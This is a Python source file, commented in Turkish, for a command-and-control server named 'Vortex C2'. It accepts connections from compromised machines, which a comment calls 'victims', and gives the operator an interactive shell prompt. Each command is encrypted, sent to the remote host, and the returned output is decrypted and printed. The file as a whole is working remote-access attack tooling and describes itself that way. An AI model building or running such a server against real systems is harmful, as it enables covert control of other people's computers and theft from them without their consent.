import socket
import threading
from common import encrypt, decrypt

# Renkler
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
RESET = '\033[0m'

HOST = '0.0.0.0' # Tüm arayüzleri dinle
PORT = 8888

def handle_client(client_socket, addr):
    print(f"\n{GREEN}[+] Yeni Bağlantı: {addr}{RESET}")
    
    while True:
        try:
            # Komut iste
            command = input(f"{CYAN}Vortex@{addr[0]}> {RESET}")
            
            if not command.strip():
                continue
            
            if command.lower() == "exit":
                client_socket.send(encrypt("exit").encode())
                break

            # 1. Komutu ŞİFRELE ve Gönder
            encrypted_cmd = encrypt(command)
            client_socket.send(encrypted_cmd.encode())
            
            # 2. Yanıtı Bekle (Maksimum 4096 byte)
            encrypted_response = client_socket.recv(4096).decode()
            
            if not encrypted_response:
                break
            
            # 3. Yanıtı ÇÖZ ve Yazdır
            decrypted_response = decrypt(encrypted_response)
            print(decrypted_response)
            
        except Exception as e:
            print(f"{RED}[!] Bağlantı Koptu: {e}{RESET}")
            break
    
    client_socket.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    
    print(f"""{RED}
    __      __        __               
    \ \    / /       / /               
     \ \  / /__  _ __| |_ _____  __    
      \ \/ / _ \| '__| __/ _ \ \/ /    
       \  / (_) | |  | |_  __/>  <     
        \/ \___/|_|   \__\___/_/\_\    
       Vortex C2 Server v1.0 (AES-256)
    {RESET}""")
    print(f"[*] Dinleniyor: {HOST}:{PORT}")
    
    while True:
        client_socket, addr = server.accept()
        # Her kurban için ayrı bir iş parçacığı (Thread) başlat
        client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_thread.start()

if __name__ == "__main__":
    start_server()
